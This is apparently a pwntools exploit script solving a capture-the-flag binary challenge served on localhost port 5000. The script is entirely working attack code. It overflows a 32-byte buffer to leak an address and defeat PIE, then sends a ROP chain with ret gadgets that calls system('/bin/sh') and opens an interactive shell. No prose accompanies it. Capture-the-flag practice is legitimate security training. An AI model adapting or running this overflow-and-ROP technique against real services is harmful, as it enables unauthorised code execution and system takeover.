from pwn import *
context.log_level='debug'
elf = context.binary = ELF("./chal")
# p = process(elf.path)
# gdb.attach(p)
p = remote("127.0.0.1", 5000)
p.sendafter(b"> ", b'a'*32)
p.sendline()
p.recvuntil(b'a'*32)
leak = u64(p.recv(6).ljust(8, b'\x00'))
elf.address = leak - elf.sym.main
print(f"base @ {hex(elf.address)}")

p.sendafter(b"> ", b''.join([
    b'a' * 32,
    p64(0),
    p64(elf.address + 0x000000000000119d),
    p64(next(elf.search(b"/bin/sh\x00"))),
    p64(elf.address + 0x0000000000001016) * 3,
    p64(elf.plt.system)
]))
p.sendline()

p.interactive()
